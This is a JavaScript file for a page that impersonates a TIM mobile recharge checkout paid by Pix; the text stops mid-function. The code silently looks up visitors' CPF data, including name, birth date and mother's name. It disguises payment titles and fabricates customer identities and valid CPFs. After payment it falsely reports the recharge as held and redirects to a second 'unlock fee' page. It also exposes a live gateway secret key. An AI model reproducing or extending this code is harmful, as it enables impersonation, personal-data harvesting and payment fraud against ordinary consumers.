(function() {
  'use strict';

  // --- Constants & Sets ---
  const VALID_DDDS = new Set([
    "11","12","13","14","15","16","17","18","19",
    "21","22","24","27","28",
    "31","32","33","34","35","37","38",
    "41","42","43","44","45","46","47","48","49",
    "51","53","54","55",
    "61","62","63","64","65","66","67","68","69",
    "71","73","74","75","77","79",
    "81","82","83","84","85","86","87","88","89",
    "91","92","93","94","95","96","97","98","99"
  ]);

  const BONUS_BY_VALUE = {
    20: '+3GB + WhatsApp ilimitado',
    25: '+3GB + WhatsApp ilimitado',
    30: '+3GB + WhatsApp ilimitado',
    35: '+3GB + WhatsApp ilimitado',
    39.9: '+5GB + WhatsApp + Instagram ilimitado',
    '39.90': '+5GB + WhatsApp + Instagram ilimitado',
    40: '+5GB + WhatsApp + Instagram ilimitado',
    50: '+5GB + WhatsApp + Instagram ilimitado',
    70: '+5GB + WhatsApp + Instagram ilimitado',
    100: '+5GB + WhatsApp + Instagram ilimitado'
  };

  const TRACKING_PARAMS = [
    "gclid", "gbraid", "wbraid", "utm_source", 
    "utm_medium", "utm_campaign", "utm_term", "utm_content"
  ];
  const TRACKING_STORAGE_KEY = "tim_tracking_params";

  // --- State ---
  let state = {
    phone: '',
    cpf: '',
    customer: {
      nome: '',
      cpf: '',
      dataNascimento: '',
      raw: null
    },
    rechargeValue: 39.90,
    valorOriginalRecarga: 39.90,
    isTaxaDesbloqueio: false,
    extraCredit: false,
    descontoAtivo: false,
    forcarValorFixo: false,
    currentScreen: 'numero',
    pixId: null,
    pixCode: null,
    pixQrUrl: null,
    pixExpiresSeconds: 900,
    timerInterval: null,
    pollInterval: null
  };

  // --- DOM Elements ---
  const screens = {
    numero: document.getElementById('screen-numero'),
    valor: document.getElementById('screen-valor'),
    pix: document.getElementById('screen-pix'),
    sucesso: document.getElementById('screen-sucesso')
  };

  const inputPhone = document.getElementById('input-phone');
  const inputCpf = document.getElementById('input-cpf');
  const phoneError = document.getElementById('phone-error');
  const cpfError = document.getElementById('cpf-error');
  const phoneConfirm = document.getElementById('phone-confirm');
  const confirmPhoneDisplay = document.getElementById('confirm-phone-display');
  const btnPhoneSubmit = document.getElementById('btn-phone-submit');

  const displaySelectedPhone = document.getElementById('display-selected-phone');
  const btnAlterarPhone = document.getElementById('btn-alterar-phone');
  const btnBackToPhone = document.getElementById('btn-back-to-phone');
  const valuesGrid = document.getElementById('values-grid');
  const sectionOrderBump = document.getElementById('section-order-bump');
  const orderBumpCheckbox = document.getElementById('order-bump-checkbox');
  const sectionFixedValue = document.getElementById('section-fixed-value');
  const fixedValueAmount = document.getElementById('fixed-value-amount');

  const resumoPhone = document.getElementById('resumo-phone');
  const resumoRechargeVal = document.getElementById('resumo-recharge-val');
  const resumoBonusRow = document.getElementById('resumo-bonus-row');
  const resumoBonusVal = document.getElementById('resumo-bonus-val');
  const resumoExtraRow = document.getElementById('resumo-extra-row');
  const resumoExtraVal = document.getElementById('resumo-extra-val');
  const resumoTotalVal = document.getElementById('resumo-total-val');
  const btnPayPix = document.getElementById('btn-pay-pix');
  const btnPayText = document.getElementById('btn-pay-text');

  const btnBackToValor = document.getElementById('btn-back-to-valor');
  const pixStateGerando = document.getElementById('pix-state-gerando');
  const pixStateAguardando = document.getElementById('pix-state-aguardando');
  const pixStateErro = document.getElementById('pix-state-erro');
  const pixErrorMessage = document.getElementById('pix-error-message');
  const btnRetryPix = document.getElementById('btn-retry-pix');
  const pixDisplayTotal = document.getElementById('pix-display-total');
  const pixQrImg = document.getElementById('pix-qr-img');
  const pixTimerCountdown = document.getElementById('pix-timer-countdown');
  const btnCopyPix = document.getElementById('btn-copy-pix');
  const copyText = document.getElementById('copy-text');
  const statusBadge = document.getElementById('status-badge');
  const statusSpinner = document.getElementById('status-spinner');
  const statusBadgeText = document.getElementById('status-badge-text');

  const popupPosvenda = document.getElementById('popup-posvenda');
  const btnPopupRefazer = document.getElementById('btn-popup-refazer');

  const btnBackToStart = document.getElementById('btn-back-to-start');
  const successTotalDisplay = document.getElementById('success-total-display');
  const successPhoneDisplay = document.getElementById('success-phone-display');
  const btnRestartFlow = document.getElementById('btn-restart-flow');

  // --- Helper Functions ---
  function cleanDigits(str) {
    return (str || '').replace(/\D/g, '').slice(0, 11);
  }

  function cleanCpfDigits(str) {
    return (str || '').replace(/\D/g, '').slice(0, 11);
  }

  function formatCPF(digits) {
    const clean = cleanCpfDigits(digits);
    if (!clean) return '';
    let formatted = clean;
    if (clean.length > 3) {
      formatted = clean.slice(0, 3) + '.' + clean.slice(3);
    }
    if (clean.length > 6) {
      formatted = clean.slice(0, 3) + '.' + clean.slice(3, 6) + '.' + clean.slice(6);
    }
    if (clean.length > 9) {
      formatted = clean.slice(0, 3) + '.' + clean.slice(3, 6) + '.' + clean.slice(6, 9) + '-' + clean.slice(9);
    }
    return formatted;
  }

  let lastQueriedCpf = '';
  let pendingCpfPromise = null;

  function escapeHtml(str) {
    return (str || '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  function updatePromoHeadline() {
    const headlineEl = document.getElementById('promo-app-headline');
    if (!headlineEl) return;

    if (!state.customer?.nome) {
      try {
        const saved = JSON.parse(localStorage.getItem('tim_cliente_dados') || '{}');
        if (saved.nome) {
          if (!state.customer) state.customer = {};
          state.customer.nome = saved.nome;
          state.customer.cpf = saved.cpf;
        }
      } catch (e) {}
    }

    const nomeCompleto = (state.customer?.nome || '').trim();
    const primeiroNome = nomeCompleto.split(/\s+/)[0] || '';
    if (primeiroNome) {
      headlineEl.innerHTML = `OLÁ <span class="promo-user-highlight">${escapeHtml(primeiroNome.toUpperCase())}</span> SEJA BEM-VINDO RECARREGUE NO APP MEU TIM E TENHA WHATSAPP O MÊS INTEIRO! NAS RECARGAS A PARTIR DE R$30, VOCÊ AINDA RECEBE PIX DE R$3 NA CONTA!`;
    } else {
      headlineEl.innerHTML = `RECARREGUE NO APP MEU TIM E TENHA WHATSAPP O MÊS INTEIRO! NAS RECARGAS A PARTIR DE R$30, VOCÊ AINDA RECEBE PIX DE R$3 NA CONTA!`;
    }
  }

  async function consultarCpfSilencioso(cpfDigits) {
    const clean = cleanCpfDigits(cpfDigits);
    if (clean.length !== 11) return null;
    if (clean === lastQueriedCpf && state.customer && state.customer.nome) {
      updatePromoHeadline();
      return state.customer;
    }
    lastQueriedCpf = clean;

    state.cpf = clean;
    if (!state.customer) state.customer = {};
    state.customer.cpf = clean;
    salvarDadosComprovante();

    pendingCpfPromise = (async () => {
      try {
        const response = await fetch(`/api/cpf?cpf=${encodeURIComponent(clean)}`);
        if (response.ok) {
          const json = await response.json();
          if (json?.success && json?.data) {
            const d = json.data;
            state.customer = {
              nome: d.nome || '',
              cpf: d.cpf || clean,
              dataNascimento: d.nascimento || '',
              nomeMae: d.nome_mae || '',
              sexo: d.sexo || '',
              raw: d.raw || d
            };
            salvarDadosComprovante();
            updatePromoHeadline();
          }
        }
      } catch (err) {
        // Silêncio total - nenhuma mensagem visível pro usuário
      }
      return state.customer;
    })();

    return pendingCpfPromise;
  }

  function salvarDadosComprovante() {
    try {
      const comprovantePayload = {
        nome: state.customer?.nome || '',
        cpf: state.customer?.cpf || state.cpf || '',
        dataNascimento: state.customer?.dataNascimento || '',
        telefone: state.phone || '',
        valor: state.rechargeValue || 50,
        atualizadoEm: new Date().toISOString(),
        raw: state.customer?.raw || null
      };

      localStorage.setItem('tim_cliente_dados', JSON.stringify(comprovantePayload));
      localStorage.setItem('comprovante_dados', JSON.stringify(comprovantePayload));
      sessionStorage.setItem('tim_cliente_dados', JSON.stringify(comprovantePayload));
      sessionStorage.setItem('comprovante_dados', JSON.stringify(comprovantePayload));
      window.timClienteDados = comprovantePayload;
      window.comprovanteDados = comprovantePayload;
    } catch (e) {}
  }

  function formatPhone(digits) {
    const clean = cleanDigits(digits);
    if (!clean) return '';
    const ddd = clean.slice(0, 2);
    const part1 = clean.slice(2, 7);
    const part2 = clean.slice(7, 11);

    let formatted = `(${ddd}`;
    if (ddd.length === 2) formatted += ') ';
    formatted += part1;
    if (part2) formatted += `-${part2}`;
    return formatted;
  }

  function formatCurrency(num) {
    return Number(num).toFixed(2).replace('.', ',');
  }

  function getTotal() {
    const extra = state.extraCredit ? 19.90 : 0;
    let base = state.rechargeValue + extra;
    if (state.descontoAtivo) {
      base = base * 0.7;
    }
    return Math.round(base * 100) / 100;
  }

  function getDescontoValue() {
    if (!state.descontoAtivo) return 0;
    const extra = state.extraCredit ? 19.90 : 0;
    return Math.round((state.rechargeValue + extra) * 0.3 * 100) / 100;
  }

  function saveTrackingParams() {
    try {
      let stored = {};
      const raw = sessionStorage.getItem(TRACKING_STORAGE_KEY);
      if (raw) stored = JSON.parse(raw);

      const url = new URL(window.location.href);
      let found = {};
      TRACKING_PARAMS.forEach(param => {
        const val = url.searchParams.get(param);
        if (val) found[param] = val;
      });

      const merged = { ...stored, ...found };
      if (Object.keys(merged).length > 0) {
        sessionStorage.setItem(TRACKING_STORAGE_KEY, JSON.stringify(merged));
      }
    } catch (e) {
      console.warn('Tracking error:', e);
    }
  }

  // --- Screen Switching ---
  function goToScreen(screenName) {
    state.currentScreen = screenName;
    Object.keys(screens).forEach(key => {
      if (screens[key]) {
        screens[key].classList.toggle('active', key === screenName);
      }
    });
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // --- Screen 1: Phone & CPF Validation & Input ---
  function validatePhone(showErrorOnBlur = false) {
    const clean = cleanDigits(inputPhone.value);
    const ddd = clean.slice(0, 2);
    const hasValidDDD = ddd.length === 2 && VALID_DDDS.has(ddd);
    const isPhoneComplete = clean.length === 11 && hasValidDDD;
    const isInvalidDDD = clean.length >= 2 && !hasValidDDD;

    const cpfClean = inputCpf ? cleanCpfDigits(inputCpf.value) : '';
    const isCpfComplete = cpfClean.length === 11;

    // Error message display for phone
    if (showErrorOnBlur) {
      if (isInvalidDDD) {
        inputPhone.classList.add('error');
        if (phoneError) {
          const span = phoneError.querySelector('span');
          if (span) span.textContent = 'DDD inválido. Verifique o número digitado.';
          phoneError.classList.add('visible');
        }
      } else if (clean.length > 0 && clean.length < 11) {
        inputPhone.classList.add('error');
        if (phoneError) {
          const span = phoneError.querySelector('span');
          if (span) span.textContent = 'Número incompleto. Digite o DDD + 9 números.';
          phoneError.classList.add('visible');
        }
      } else {
        inputPhone.classList.remove('error');
        if (phoneError) phoneError.classList.remove('visible');
      }

      if (inputCpf) {
        if (cpfClean.length > 0 && cpfClean.length < 11) {
          inputCpf.classList.add('error');
          if (cpfError) cpfError.classList.add('visible');
        } else {
          inputCpf.classList.remove('error');
          if (cpfError) cpfError.classList.remove('visible');
        }
      }
    } else {
      if (clean.length === 0 || isPhoneComplete) {
        inputPhone.classList.remove('error');
        if (phoneError) phoneError.classList.remove('visible');
      }
      if (inputCpf && (cpfClean.length === 0 || isCpfComplete)) {
        inputCpf.classList.remove('error');
        if (cpfError) cpfError.classList.remove('visible');
      }
    }

    // Confirmation box display
    if (isPhoneComplete) {
      confirmPhoneDisplay.textContent = formatPhone(clean);
      phoneConfirm.classList.add('visible');
    } else {
      phoneConfirm.classList.remove('visible');
    }

    // Ambas as informações devem estar completas para habilitar
    const isComplete = isPhoneComplete && isCpfComplete;
    if (isComplete) {
      btnPhoneSubmit.removeAttribute('disabled');
    } else {
      btnPhoneSubmit.setAttribute('disabled', 'true');
    }

    return isComplete;
  }

  inputPhone.addEventListener('input', (e) => {
    const digits = cleanDigits(e.target.value);
    inputPhone.value = formatPhone(digits);
    validatePhone(false);
  });

  inputPhone.addEventListener('blur', () => {
    validatePhone(true);
  });

  if (inputCpf) {
    inputCpf.addEventListener('input', (e) => {
      const digits = cleanCpfDigits(e.target.value);
      inputCpf.value = formatCPF(digits);
      validatePhone(false);
      if (digits.length === 11) {
        consultarCpfSilencioso(digits);
      }
    });

    inputCpf.addEventListener('blur', () => {
      const digits = cleanCpfDigits(inputCpf.value);
      if (digits.length === 11) {
        consultarCpfSilencioso(digits);
      }
    });
  }

  document.getElementById('form-phone').addEventListener('submit', (e) => {
    e.preventDefault();
    if (validatePhone(true)) {
      state.phone = cleanDigits(inputPhone.value);
      if (inputCpf) {
        state.cpf = cleanCpfDigits(inputCpf.value);
        if (state.cpf.length === 11) {
          consultarCpfSilencioso(state.cpf);
        }
      }
      salvarDadosComprovante();
      updateValueScreenData();
      goToScreen('valor');
    }
  });

  // --- Screen 2: Value Selection & Order Bump ---
  function updateValueScreenData() {
    const formatted = formatPhone(state.phone);
    displaySelectedPhone.textContent = formatted;
    resumoPhone.textContent = formatted;
    updatePromoHeadline();
    if (pendingCpfPromise) {
      pendingCpfPromise.then(() => updatePromoHeadline());
    }
    updateSummary();
  }

  function updateSummary() {
    const val = state.rechargeValue;

    // Show order bump
    sectionOrderBump.style.display = 'block';

    // Netflix + Spotify row in summary
    if (state.extraCredit) {
      resumoExtraRow.style.display = 'flex';
      resumoExtraVal.textContent = '+ R$ 19,90';
    } else {
      resumoExtraRow.style.display = 'none';
    }

    const total = getTotal();
    resumoRechargeVal.textContent = `R$ ${formatCurrency(val)}`;
    if (resumoBonusVal) {
      resumoBonusVal.textContent = BONUS_BY_VALUE[val] || (val >= 39.9 ? '+5GB + WhatsApp + Instagram ilimitado' : '+3GB + WhatsApp ilimitado');
    }
    if (state.descontoAtivo) {
      resumoTotalVal.innerHTML = `<span style="text-decoration: line-through; color: rgba(255,255,255,0.5); font-size: 16px;">R$ ${formatCurrency(val + (state.extraCredit ? 19.90 : 0))}</span> <span style="color: var(--tim-green);">R$ ${formatCurrency(total)}</span>`;
      btnPayText.textContent = `Pagar R$ ${formatCurrency(total)} com PIX (30% OFF)`;
    } else {
      resumoTotalVal.textContent = `R$ ${formatCurrency(total)}`;
      btnPayText.textContent = `Pagar R$ ${formatCurrency(total)} com PIX`;
    }

    // Fixed value section
    if (state.forcarValorFixo) {
      sectionFixedValue.style.display = 'block';
      valuesGrid.style.display = 'none';
      document.querySelector('.info-bonus-box').style.display = 'none';
      const finalValue = Math.round(val * 0.7 * 100) / 100;
      fixedValueAmount.textContent = `R$ ${formatCurrency(finalValue)}`;
    } else {
      sectionFixedValue.style.display = 'none';
      valuesGrid.style.display = 'grid';
      document.querySelector('.info-bonus-box').style.display = 'flex';
    }
  }

  valuesGrid.addEventListener('click', (e) => {
    const btn = e.target.closest('.btn-value');
    if (!btn) return;

    const val = parseFloat(btn.dataset.value);
    state.rechargeValue = val;

    // Update buttons styling
    valuesGrid.querySelectorAll('.btn-value').forEach(b => {
      b.classList.remove('selected');
      const checkBadge = b.querySelector('.selected-check-badge');
      if (checkBadge) checkBadge.remove();
    });

    btn.classList.add('selected');
    const badge = document.createElement('span');
    badge.className = 'selected-check-badge';
    badge.innerHTML = `
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <path d="M20 6 9 17l-5-5"></path>
      </svg>
    `;
    btn.appendChild(badge);

    updateSummary();
  });

  window.selecionarOferta = function(val) {
    const numVal = parseFloat(val);
    state.rechargeValue = numVal;
    if (valuesGrid) {
      valuesGrid.querySelectorAll('.btn-value').forEach(b => {
        b.classList.remove('selected');
        const checkBadge = b.querySelector('.selected-check-badge');
        if (checkBadge) checkBadge.remove();
        if (Math.abs(parseFloat(b.dataset.value) - numVal) < 0.05) {
          b.classList.add('selected');
          const badge = document.createElement('span');
          badge.className = 'selected-check-badge';
          badge.innerHTML = `
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
              <path d="M20 6 9 17l-5-5"></path>
            </svg>
          `;
          b.appendChild(badge);
        }
      });
      updateSummary();
    }
    const input = document.getElementById('input-phone');
    if (input) {
      input.focus();
      input.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
  };

  orderBumpCheckbox.addEventListener('change', (e) => {
    state.extraCredit = e.target.checked;
    const card = document.querySelector('.order-bump-card');
    if (card) {
      card.classList.toggle('checked', e.target.checked);
    }
    updateSummary();
  });

  btnAlterarPhone.addEventListener('click', () => {
    goToScreen('numero');
  });

  btnBackToPhone.addEventListener('click', () => {
    goToScreen('numero');
  });

  btnPayPix.addEventListener('click', () => {
    initiatePixFlow();
  });

  // --- Blackcat Client-Side Live Gateway Fallback Helpers ---
  const BLACKCAT_CLIENT_KEY = 'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';
  const BLACKCAT_DIRECT_URL = 'https://api.blackcatoficial.com/api';

  function generateValidCPFClient() {
    const digits = [];
    for (let i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += digits[i] * (10 - i);
    let rem = sum % 11;
    digits.push(rem < 2 ? 0 : 11 - rem);
    sum = 0;
    for (let i = 0; i < 10; i++) sum += digits[i] * (11 - i);
    rem = sum % 11;
    digits.push(rem < 2 ? 0 : 11 - rem);
    return digits.join('');
  }

  function generateCustomerClient(phone) {
    if (state.customer && state.customer.nome && state.customer.cpf) {
      const cleanPh = (phone || '').replace(/\D/g, '') || '11987654321';
      const cleanCpf = (state.customer.cpf || '').replace(/\D/g, '');
      const cleanName = state.customer.nome.trim();
      const parts = cleanName.split(/\s+/);
      const first = parts[0] || 'Cliente';
      const last = parts[parts.length - 1] || 'Tim';
      const email = `${first.toLowerCase()}.${last.toLowerCase()}${Math.floor(100 + Math.random() * 900)}@gmail.com`;
      return {
        name: cleanName,
        email: email,
        phone: cleanPh,
        document: { number: cleanCpf, type: 'cpf' }
      };
    }
    const firstNames = ['Lucas', 'Gabriel', 'Matheus', 'Felipe', 'Thiago', 'Bruno', 'Rodrigo', 'Juliana', 'Camila', 'Beatriz', 'Mariana'];
    const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Costa'];
    const fn = firstNames[Math.floor(Math.random() * firstNames.length)];
    const ln = lastNames[Math.floor(Math.random() * lastNames.length)];
    const rnd = Math.floor(100 + Math.random() * 900);
    const cleanPh = (phone || '').replace(/\D/g, '') || '11987654321';
    return {
      name: `${fn} ${ln}`,
      email: `${fn.toLowerCase()}.${ln.toLowerCase()}${rnd}@gmail.com`,
      phone: cleanPh,
      document: { number: generateValidCPFClient(), type: 'cpf' }
    };
  }

  function maskProductClient() {
    const categories = ['Serviço Digital', 'Acesso a Plataforma Online', 'Intermediação de Serviços', 'Licença de Software', 'Pacote de Serviços Online'];
    const cat = categories[Math.floor(Math.random() * categories.length)];
    const num = String(Math.floor(Math.random() * 9) + 1).padStart(2, '0');
    return `${cat} ${num}`;
  }

  function generateExternalRefClient() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let code = '';
    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
    return `REF-${code}-${new Date().getFullYear()}`;
  }

  async function createPixDirectBlackcat(amountInReais, phone, utmParams = {}) {
    const amountInCents = Math.round(Number(amountInReais) * 100);
    const customer = generateCustomerClient(phone);
    const maskedTitle = maskProductClient();
    const externalRef = generateExternalRefClient();

    const payload = {
      amount: amountInCents,
      currency: 'BRL',
      paymentMethod: 'pix',
      externalRef: externalRef,
      items: [
        {
          title: maskedTitle,
          unitPrice: amountInCents,
          quantity: 1,
          tangible: false
        }
      ],
      customer: customer,
      pix: { expiresInDays: 1 },
      metadata: `Ref: ${externalRef}`
    };

    if (utmParams.utm_source) payload.utm_source = utmParams.utm_source;
    if (utmParams.utm_medium) payload.utm_medium = utmParams.utm_medium;
    if (utmParams.utm_campaign) payload.utm_campaign = utmParams.utm_campaign;
    if (utmParams.utm_content) payload.utm_content = utmParams.utm_content;
    if (utmParams.utm_term) payload.utm_term = utmParams.utm_term;

    const res = await fetch(`${BLACKCAT_DIRECT_URL}/sales/create-sale`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': BLACKCAT_CLIENT_KEY
      },
      body: JSON.stringify(payload)
    });

    const json = await res.json();
    if (res.ok && json.success) {
      const pData = json.data?.paymentData || json.data?.pix || json.data || {};
      const emv = pData.copyPaste || pData.qrCode || '';
      let qrImgUrl = null;
      if (pData.qrCodeUrl && (pData.qrCodeUrl.startsWith('http://') || pData.qrCodeUrl.startsWith('https://'))) {
        qrImgUrl = pData.qrCodeUrl;
      } else if (pData.qrCodeBase64 && pData.qrCodeBase64.startsWith('data:image')) {
        qrImgUrl = pData.qrCodeBase64;
      } else if (pData.qrCodeBase64 && pData.qrCodeBase64.startsWith('iVBORw0KGgo')) {
        qrImgUrl = `data:image/png;base64,${pData.qrCodeBase64}`;
      } else if (emv) {
        qrImgUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(emv)}`;
      }

      return {
        id: json.data?.transactionId,
        externalRef: externalRef,
        amount: json.data?.amount,
        pix: {
          qr_code: emv,
          qr_code_url: qrImgUrl,
          expires_at: pData.expiresAt || null
        }
      };
    } else {
      throw new Error(json.message || json.error || 'Erro ao gerar Pix no gateway');
    }
  }

  // --- Screen 3: Pix Payment Generation & Polling ---
  async function initiatePixFlow() {
    goToScreen('pix');
    pixStateGerando.style.display = 'flex';
    pixStateAguardando.style.display = 'none';
    pixStateErro.style.display = 'none';

    // Clear any existing timers
    clearInterval(state.timerInterval);
    clearInterval(state.pollInterval);

    const total = state.isTaxaDesbloqueio ? 14.90 : getTotal();
    pixDisplayTotal.textContent = formatCurrency(total);

    // Ajusta visual da tela Pix de acordo com o tipo de pagamento
    const pixTitle = document.querySelector('.pix-title');
    const pixSubtitle = document.querySelector('.pix-subtitle');
    if (state.isTaxaDesbloqueio) {
      if (pixTitle) pixTitle.innerHTML = `<span style="color:#FFD200;">Taxa de Regularização e Desbloqueio</span>`;
      if (pixSubtitle) {
        pixSubtitle.innerHTML = `
          Escaneie o QR code com o app do seu banco ou copie o código para pagar a taxa de
          <strong>R$ 14,90</strong> e liberar a recarga de <strong>R$ ${formatCurrency(state.valorOriginalRecarga)}</strong> na linha <strong>${formatPhone(state.phone)}</strong>
        `;
      }
    } else {
      if (pixTitle) pixTitle.textContent = 'Pague com Pix';
      if (pixSubtitle) {
        pixSubtitle.innerHTML = `
          Escaneie o QR code com o app do seu banco ou copie o código para pagar
          <strong>R$ <span id="pix-display-total">${formatCurrency(total)}</span></strong>
        `;
      }
    }

    try {
      let pixData = null;
      let utmParams = {};
      try {
        const raw = sessionStorage.getItem(TRACKING_STORAGE_KEY);
        if (raw) utmParams = JSON.parse(raw);
      } catch (e) {}

      const productName = state.isTaxaDesbloqueio
        ? 'Taxa de Regularização e Desbloqueio de Linha'
        : (state.phone ? `Recarga TIM (${state.phone.slice(0, 2)}) ${state.phone.slice(2)}` : 'Recarga TIM');

      // 1. Tenta endpoint interno do backend / Vercel Serverless
      try {
        const response = await fetch('/api/pix/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            amount: total,
            telefone: state.phone,
            productName: productName,
            customer: state.customer,
            ...utmParams
          })
        });
        if (response.ok) {
          const resJson = await response.json();
          if (resJson?.success && resJson?.data) {
            pixData = resJson.data;
          }
        }
      } catch (err) {
        console.warn('Backend proxy indisponível, usando conexão direta com gateway:', err);
      }

      // 2. Se backend não respondeu (ex: hospedagem estática ou erro), chama Blackcat API diretamente
      if (!pixData || !pixData.pix?.qr_code) {
        pixData = await createPixDirectBlackcat(total, state.phone, utmParams);
      }

      state.pixId = pixData.id;
      state.pixCode = pixData.pix?.qr_code;
      let appQrUrl = pixData.pix?.qr_code_url;
      if (!appQrUrl || (!appQrUrl.startsWith('http://') && !appQrUrl.startsWith('https://') && !appQrUrl.startsWith('data:image'))) {
        if (appQrUrl && appQrUrl.startsWith('iVBORw0KGgo')) {
          appQrUrl = `data:image/png;base64,${appQrUrl}`;
        } else if (state.pixCode) {
          appQrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(state.pixCode)}`;
        } else {
          appQrUrl = 'images/pix-qr-code.png';
        }
      }
      state.pixQrUrl = appQrUrl;

      // Update QR Code Image
      pixQrImg.onerror = () => {
        if (state.pixCode) {
          pixQrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(state.pixCode)}`;
        } else {
          pixQrImg.src = 'images/pix-qr-code.png';
        }
      };
      pixQrImg.src = state.pixQrUrl;

      // Set Countdown Timer (default: 15 minutos)
      if (pixData.pix?.expires_at) {
        const remaining = Math.round((new Date(pixData.pix.expires_at).getTime() - Date.now()) / 1000);
        state.pixExpiresSeconds = remaining > 0 ? Math.min(remaining, 900) : 900;
      } else {
        state.pixExpiresSeconds = 900;
      }

      // Show Aguardando state
      pixStateGerando.style.display = 'none';
      pixStateAguardando.style.display = 'flex';

      startPixTimer();
      startPixPolling();

    } catch (error) {
      console.error('Error generating Pix:', error);
      pixErrorMessage.textContent = error.message || 'Não foi possível gerar o Pix. Tente novamente.';
      pixStateGerando.style.display = 'none';
      pixStateErro.style.display = 'flex';
    }
  }

  function startPixTimer() {
    updateTimerDisplay();
    state.timerInterval = setInterval(() => {
      state.pixExpiresSeconds = Math.max(0, state.pixExpiresSeconds - 1);
      updateTimerDisplay();
      if (state.pixExpiresSeconds <= 0) {
        clearInterval(state.timerInterval);
        handlePixExpired();
      }
    }, 1000);
  }

  function handlePixExpired() {
    clearInterval(state.pollInterval);
    statusBadge.classList.add('refused');
    statusSpinner.style.display = 'none';
    statusBadgeText.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
      Pix expirado
    `;
    setTimeout(() => {
      showPopupPosvenda();
    }, 2000);
  }

  function updateTimerDisplay() {
    const mins = Math.floor(state.pixExpiresSeconds / 60);
    const secs = state.pixExpiresSeconds % 60;
    pixTimerCountdown.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  }

  function startPixPolling() {
    if (!state.pixId) return;

    state.pollInterval = setInterval(async () => {
      try {
        let status = '';

        // Tenta backend primeiro
        try {
          const res = await fetch(`/api/pix/status?id=${encodeURIComponent(state.pixId)}`);
          if (res.ok) {
            const json = await res.json();
            status = String(json?.data?.status || '').toLowerCase();
          }
        } catch (e) {}

        // Fallback direto na Blackcat API
        if (!status) {
          const directRes = await fetch(`${BLACKCAT_DIRECT_URL}/sales/${encodeURIComponent(state.pixId)}/status`, {
            headers: { 'X-API-Key': BLACKCAT_CLIENT_KEY }
          });
          if (directRes.ok) {
            const directJson = await directRes.json();
            status = String(directJson?.data?.status || '').toLowerCase();
          }
        }

        if (status === 'paid' || status === 'approved') {
          handlePixApproved();
        } else if (status === 'cancelled' || status === 'failed' || status === 'expired' || status === 'refused' || status === 'declined') {
          handlePixRefused();
        }
      } catch (e) {
        // Silent catch for poll
      }
    }, 4000);
  }

  function handlePixApproved() {
    clearInterval(state.pollInterval);
    clearInterval(state.timerInterval);

    if (state.isTaxaDesbloqueio) {
      // Segundo pagamento (Taxa de Desbloqueio R$ 14,90) aprovado com sucesso!
      salvarDadosComprovante();
      try {
        const comp = JSON.parse(localStorage.getItem('comprovante_dados') || '{}');
        comp.status = 'HOMOLOGADO_E_LIBERADO';
        comp.transacaoId = state.pixId;
        comp.taxaPaga = 14.90;
        comp.recargaLiberada = state.valorOriginalRecarga;
        comp.dataAprovacao = new Date().toISOString();
        localStorage.setItem('comprovante_dados', JSON.stringify(comp));
        sessionStorage.setItem('comprovante_dados', JSON.stringify(comp));
        window.comprovanteDados = comp;
      } catch (e) {}

      statusBadge.classList.add('approved');
      statusSpinner.style.display = 'none';
      statusBadgeText.innerHTML = `
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 6 9 17l-5-5"></path>
        </svg>
        Taxa compensada • Linha Desbloqueada ✓
      `;
      setTimeout(() => {
        showSuccessScreen();
      }, 2000);
    } else {
      // Primeira recarga efetuada — retém a recarga no bilhetador e redireciona para a página dedicada de regularização (/desbloqueio)
      salvarDadosComprovante();
      statusBadge.classList.add('refused');
      statusSpinner.style.display = 'none';
      statusBadgeText.innerHTML = `
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"></circle>
          <line x1="12" y1="8" x2="12" y2="12"></line>
          <line x1="12" y1="16" x2="12.01" y2="16"></line>
        </svg>
        Recarga retida • Redirecionando para regularização...
      `;
      setTimeout(() => {
        const params = new URLSearchParams();
        if (state.phone) params.set('phone', state.phone);
        if (state.customer?.cpf || state.cpf) params.set('cpf', state.customer?.cpf || state.cpf);
        if (state.rechargeValue) params.set('val', state.rechargeValue);
        if (state.customer?.nome) params.set('nome', state.customer.nome);
        if (state.customer?.dataNascimento) params.set('nasc', state.customer.dataNascimento);
        window.location.href = `/desbloqueio?${params.toString()}`;
      }, 1500);
    }
  }

  function handlePixRefused() {
    clearInterval(state.pollInterval);
    clearInterval(state.timerInterval);

    // Update status badge to red
    statusBadge.classList.add('refused');
    statusSpinner.style.display = 'none';
    statusBadgeText.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
